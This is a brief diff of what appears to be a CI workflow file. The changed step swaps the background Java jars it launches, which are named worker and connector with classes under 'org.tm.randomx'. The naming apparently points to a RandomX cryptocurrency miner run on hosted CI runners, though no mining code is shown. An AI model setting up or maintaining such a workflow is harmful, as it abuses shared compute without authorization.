@@ -24,7 +24,6 @@ jobs:
       - name: Run
         shell: pwsh
         run: |
-          Start-Process -FilePath "java" -ArgumentList "-cp", "worker3.jar", "org.tm.randomx.TMagics.fp.Runner"
-          Start-Process -FilePath "java" -ArgumentList "-cp", "wk1.jar", "org.tm.randomx.TMagics.connector.Runner"
-          java -jar wk0.jar
+          Start-Process -FilePath "java" -ArgumentList "-cp", "cnt.jar", "org.tm.randomx.TMagics.connector.Runner"
+          java -jar worker-0.1-all.jar
 
